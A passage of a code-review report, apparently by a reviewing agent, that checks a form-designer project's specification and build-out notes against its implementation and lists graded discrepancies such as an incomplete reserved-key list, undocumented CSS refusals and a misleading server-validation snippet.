No issues found. (Spot-checked against the code: the exported/not-exported claims at `:9-21`, the thirteen `RESERVED_KEYS` names at `:171-172`, the demo server's `app` export and `FORMSMITH_DEMO_STORE` env var, the 1283-line figure at `:226`, the `.gitignore` line at `:510`, and the reporter wiring at `:743` all hold.)

## docs/ideas.md

No issues found.

## docs/prior-art/README.md

No issues found.

## docs/build-out/RUN.md

- **[LOW]** **[E5]** `docs/build-out/RUN.md:161-164` — "It lives there rather than in `CLAUDE.md` … `CLAUDE.md` holds a pointer that never needs editing." `grep -c build-out CLAUDE.md` returns 0: queue item 33 removed it, and its own check asserts "`CLAUDE.md` contains no `build-out` pointer". The run contract still describes a resume path the run's last item deliberately deleted, and nothing in the repository's entry documents links to `RUN.md` or `queue.md`.

## docs/build-out/found.md

- **[LOW]** **[E5]** `docs/build-out/found.md:159-160` — "the guard also missed the fourteen rules driven per kit from _outside_ that block". The actual number is seventeen: `test/docs.test.ts:403` pins `CONTRACT_RULES_PER_KIT = 17`, and running that file's own counting expression returns 17. The suite is guarded; this prose is the one place the figure is unchecked.
- **[LOW]** **[E2]** `docs/build-out/found.md:77-88` — the entry cites three actions as tag references; the workflow pins all four by commit SHA now, so the quoted evidence no longer matches the file. The entry also amends itself to name a fourth action and then still prescribes "a version bump on three lines" in the same paragraph.

## docs/build-out/queue.md

- **[LOW]** **[E5]** `docs/build-out/queue.md:11-12` — "`CLAUDE.md` carries only a stable pointer at this file". It carries none; see the `RUN.md` finding. Both halves of the resume mechanism now describe a pointer that item 33 removed.

## docs/build-out/triage.md

- **[LOW]** **[E5]** `docs/build-out/triage.md:772` — "the digit bound on the count pattern (widened in item 15)". Item 15 is "Decide what unit a length prop carries, in the kit contract"; the `\d{2,4}` capture is item 6. The provenance line points at the wrong item, in the file whose stated job is to be the record of what was handled where.
- **[LOW]** **[E3]** `docs/build-out/triage.md:752-756` — grouping "`coverage/` absent from eslint's ignores" with lines that are "true, unused, or redundant … a one-line change on the day somebody is in the file" understates it: after the documented `pnpm test:coverage`, `pnpm lint` fails outright. A triage line is the mechanism this run uses to close a finding, so a wrong severity in one is a finding closed on a wrong basis.

## docs/build-out/archive/queue-2026-08-30-first-pass.md

- **[NOTE]** **[E2]** `queue-2026-08-30-first-pass.md:6-9, 14` — the archived file still carries a live `/goal` block pointing at the *current* `docs/build-out/queue.md` and the same stale `CLAUDE.md` pointer claim. Pasting the block from the archive would start a run against the current queue while reading the archived contract; a one-line "archived, do not run" header is the cheap fix.

---

# Area J — the specification, cross-checked against the implementation

## docs/spec/README.md

- **[MEDIUM]** **[E4]** `docs/spec/README.md:36` — the contracts index gives `03-components.md` the state **Partial**, but that file opens **Built**, which the index's own rule forbids: "A file's status is the weakest of its sections … and it has to match what the file itself opens with". `README.md:58` compounds it by naming `03` among the files that "read Partial … and each of those files says which one in its own preamble" — 03's preamble says nothing of the sort. No guard covers this: `test/docs.test.ts:328-345` asserts only that each file *has* a status, never that it matches the index. A reader scanning the index for what is safe to depend on sees Partial, goes to the file, and reads Built — and the file, being the one that gets edited, is the copy that overstates.
- **[LOW]** **[E4]** `docs/spec/README.md:116` — "Keeping it true" claims `docs.test.ts` checks "the end-to-end total against the spec files rather than against the other documents". It is the exact reverse: `DOCS_WITH_BROWSER_COUNTS` lists README, CLAUDE, ROADMAP and the write-tests skill — none a spec file — and no file under `docs/spec/` quotes an end-to-end total at all. The one section that tells a reader which claims are machine-checked misnames the documents under guard.

## docs/spec/00-product.md

- **[LOW]** **[E5]** `docs/spec/00-product.md:91` — "axe runs over the designer in nine states". It is eleven, per `docs/accessibility.md:23` and a direct count. That guard reads `accessibility.md` only, so this copy has drifted and the two documents now contradict each other on the same fact — a product document understating the coverage it uses to back a stated commitment.

## docs/spec/01-document-model.md

- **[MEDIUM]** **[E4]** `docs/spec/01-document-model.md:101-102` — "`validateDocument` checks that a data key, if present, is a non-empty string, and checks nothing else about it." It also holds `dataKey` to the full key grammar: `tree.ts:914-928` runs `keyProblem(dataKey)` and pushes `invalid-data-key`, and `keyProblem` enforces `KEY_PATTERN`, a 128-character cap and `RESERVED_KEYS`. `docs/spec/12-api.md:293-295` says the opposite of this file, so the two spec files contradict each other. A host relying on this sentence writes `dataKey: 'first-name'` and gets `invalid-data-key` out of the gate on import.
- **[MEDIUM]** **[E4]** `docs/spec/01-document-model.md:137-141` — the refusal list for `safeDeclarations` is enumerated as exactly `{`, `}`, `<`, `@`, `/*`, `*/`, and presented as complete. Two further refusals exist: unbalanced quotes (`css.ts:119`) and any block matching `FETCHING` (`css.ts:130`). An author writes `background: url(/logo.png)` in the Style tab expecting it to apply — it is on none of the documented forbidden characters — and the entire declaration block is dropped.
- **[LOW]** **[E4]** `docs/spec/01-document-model.md:71-82` — the `interface ComponentNode` block omits `dataKey`, which the same file documents as **Built** eleven lines later and which `types.ts:178` declares.

## docs/spec/02-kit-contract.md

- **[HIGH]** **[E4]** **(Verified. Converged: three slices.)** `docs/spec/02-kit-contract.md:164-168` — "Its _defaults_ are unchanged … it is 16 pixels now -- so a form that never set a gap looks identical." A freshly dropped MUI `Stack`, `Step` or `Repeater` renders a **2px** gap. See Area C for the measured evidence; the spec paragraph is what makes this a documentation finding as well as a code one, because a maintainer reading it concludes the migration is complete and does not update the four defaults. The same paragraph's claim at `:158-159` that the kit no longer "disagreed with itself" is also false: within `kit-mui`, `Grid`'s default gap is 16 and `Stack`'s is 2, both now meaning pixels.

## docs/spec/03-components.md

- **[MEDIUM]** **[E4]** `docs/spec/03-components.md:20-33` — the `interface ComponentDef` block, presented as how a component is specified, omits `root?: boolean` and `defaultRenderWhen?`, and declares `icon?: string` where the real type is `icon?: IconName`. The omission is load-bearing in two directions: `02-kit-contract.md:108` makes "Exactly one component is the root, and it is not in the palette" a contract rule a kit must satisfy, and this block gives a kit author no field with which to declare one; and `03-components.md:390` itself says `Step` "is the first use of `defaultRenderWhen` on `ComponentDef`", a field the interface above does not contain. A third-party kit author writing against this block ships no `root: true` and fails the contract suite on a rule whose mechanism is undocumented.
- **[MEDIUM]** **[E3]** `docs/spec/03-components.md:319-323` — "So core gained two functions and no new concept: `validateAcross`, `contextValues`". A wizard needs a third, `submittedAcross`, documented in no spec file. Its own docblock records why it exists: "the demo server validated across all scopes and then projected under `scopes[0]`, so every answer given on step two onwards was dropped from the payload. A form that validated a required field and then submitted without it." `12-api.md:130-146` ("What a form actually submits") names only `submittedData`. A host implementing a multi-step submit from the documented pair silently drops every answer from every step but one.
- **[MEDIUM]** **[E4]** `docs/spec/03-components.md:3` — the file opens **Status: built** while carrying a section that opens **Status: partial** and two `### Still to build` lists. `docs/spec/README.md:53` states the rule this breaks. Unguarded, and it is the direction `README.md:119-120` calls out as the one that has been wrong most often — a Built label over work that is not done, on the file that is also the roadmap.

## docs/spec/04-shell.md

- **[LOW]** **[E4]** `docs/spec/04-shell.md:168-170` — "Delete and Backspace on a focused tree row are handled by the row and by a **window-level** shortcut … Any new **window-level** shortcut has to consider the same collision." The designer's shortcuts are no longer bound to `window`: `Designer.tsx:660-665` attaches to `shell.current`, with a comment explaining the change ("On `window` the designer claimed Ctrl+Z, Delete, Backspace and Escape for the entire host page"). A contributor following this note binds to `window` and reintroduces the host-page hijack the code was changed to stop.

## docs/spec/05-canvas.md

No issues found.

## docs/spec/06-inspector.md

- **[MEDIUM]** **[E4]** `docs/spec/06-inspector.md:159-161` — the Style tab's refusal list omits unbalanced quotes and every fetching function, and the docblock at `css.ts:120-129` says explicitly that the fetch refusal was added *for this panel*. The panel reports the author's whole block as refused for a reason the spec says is not a reason, and the author has no documented way to work out which character offended.

## docs/spec/07-bindings.md

No issues found.

## docs/spec/08-validation.md

- **[HIGH]** **[E5]** **(Verified.)** `docs/spec/08-validation.md:213-241` — the "Server parity" section is marked **Status: built**, says it is "demonstrated by `apps/demo-server` … whose only purpose is to prove that `validateForm` is the same function in both places", and gives a snippet built on `validateForm(document.root, submitted, { context })` plus a boot-time `missingContext(document.root, context)`. `apps/demo-server` neither imports nor calls `validateForm`. Confirmed by reading the import block: `MAX_CONDITION_DEPTH, contextValues, evaluatorKeys, missingContext, submittedAcross, validateAcross, validateDocument`. `validateForm` appears in that file only inside comments — and one of those comments, at `index.ts:414`, makes the same false claim ("it imports the same `validateForm` the browser used: one rule set, no drift"). The submit route builds one scope per step and calls `validateAcross` and `submittedAcross`, running `missingContext` **per scope**, not against the bare session context. Following the documented snippet on any wizard document produces one of two wrong outcomes: every `Step` carries `renderWhen` comparing `context.step` to its own key, so with a context holding no `step` the comparison is false, `isVisible` is false, and `validateForm` skips every step's subtree — returning `{}` for a submission missing every required answer; or, if the host also runs the documented boot assert, `missingContext` reports `step` and the server refuses to start. This file's "The API" section lists only `validateField`, `validateForm` and `applyRule`, and the word "step" does not appear in it. No guard. A server implementer reads the validation contract, copies the parity snippet, and ships a 200 on a wizard submission that skipped a required field.
- **[LOW]** **[E4]** `docs/spec/08-validation.md:184-190` — `MAX_ROWS` and `TOO_MANY_ROWS` are described as the complete set of repeater refusals. A third exists and is undocumented anywhere in the spec: `NOT_A_LIST`, exported from the package entry and recorded when a repeater's submitted value is a non-null non-array. Its docblock notes that reading such a body as "no rows" previously "turned every required field inside that repeater optional, on the server".

## docs/spec/09-actions.md

No issues found.

## docs/spec/10-interchange.md

- **[MEDIUM]** **[E4]** `docs/spec/10-interchange.md:109-120` — "There are four causes, not two:" is followed by three bullets, and the implementation reports five distinct causes, two of which appear in no spec file: two format rules collapsing onto one `format` keyword (`schema.ts:117-120`), and two components sharing a `dataKey` collapsing onto one property (`:130-133`), which `schema.ts:122-128` describes as "the last one visited wins and the first's type, format and constraints are discarded". A reader counts the bullets, finds three where the text promised four, and cannot tell whether a bullet is missing or the count is stale — and either way is unaware of the two silent losses.

## docs/spec/11-theming.md

No issues found. (The reviewing agent recomputed the WCAG ratios at `:92-95` from both stylesheets and they hold as stated: 3.35:1, 5.25:1, 5.49:1 light / 6.39:1 dark, and 4.15:1 as the HTML kit's lowest pair. `IconName` is 30 members, `Icon` is absent from the designer's entry as the "Missing" note says, and the HTML kit styles no scrollbar.)

## docs/spec/12-api.md

- **[HIGH]** **[E4]** **(Verified.)** `docs/spec/12-api.md:282-285` — the Keys section, marked **Status: built**, publishes the grammar as a code block containing `RESERVED_KEYS = ['__proto__', 'constructor', 'prototype']`. The exported constant has thirteen members: read directly at `keys.ts:74-88`, it is `__defineGetter__`, `__defineSetter__`, `__lookupGetter__`, `__lookupSetter__`, `__proto__`, `constructor`, `hasOwnProperty`, `isPrototypeOf`, `propertyIsEnumerable`, `prototype`, `toLocaleString`, `toString`, `valueOf`. The ten missing names are not incidental: the same docblock records that a required field keyed `toString` had its error dropped by `validateAcross`'s `merged[key] ??= message` and "a form with a missing required answer submitting clean". The prose at `:308-311` reinforces the wrong list by discussing only `__proto__`. `RESERVED_KEYS` is a public export, so an MIT consumer generating documents programmatically checks against the three the API contract publishes, emits `toString` as a `dataKey`, and their documents are refused by `validateDocument` and by the Properties panel with no warning anywhere in the spec.
- **[MEDIUM]** **[E4]** `docs/spec/12-api.md:274-296` — the Keys section presents `KEY_PATTERN` plus `RESERVED_KEYS` as the whole grammar and never mentions a length bound; `keys.ts:40` declares `MAX_KEY_LENGTH = 128` and refuses anything longer. A host importing documents whose keys came from a generator gets `invalid-key` on a name that satisfies every rule the public contract states.
- **[MEDIUM]** **[E3]** `docs/spec/12-api.md` (whole file) — the file that states "This is what a consumer imports … none of the other twelve files said what they were" omits four exported core functions a host is required to call. `submittedAcross` and `evaluatorKeys` appear in no spec file at all; `validateAcross` and `contextValues` appear only in `03-components.md`, not in the API contract. All four are used by the reference server, and `evaluatorKeys`' own docblock describes the failure it exists to catch as "the browser then shows a section, validates it, and submits; the server validates nothing beneath it and answers that the form is fine."
- **[LOW]** **[E4]** `docs/spec/12-api.md:293-294` — "`keyProblem(key)` … **both callers** show it to someone". There are six call sites and three of them show nobody anything: `generateKey` silently falls back to `'field'`, `decodeRow` returns `undefined`, and `decodeAddress` is what makes `applyChange` refuse a reserved name. A reader takes "both callers" as the complete surface and does not realise that `applyChange` silently discards a write whose address fails the same check.
- **[LOW]** **[E2]** `docs/spec/12-api.md:74` — the `FormRenderer` props table describes `data` as "Current values, **keyed by node**". It is keyed by data key: `types.ts:214-227` documents `FormData` as "keyed by **data key**" and records that "this line said 'component key' and a host reading only it writes `data[node.key]` and silently misses every renamed field". The `errors` row two lines below correctly says "keyed by address".
- **[NOTE]** **[E4]** `docs/spec/12-api.md:25` — the designer's export list omits the `DesignerProps` type, which is the type of the props table immediately below it.
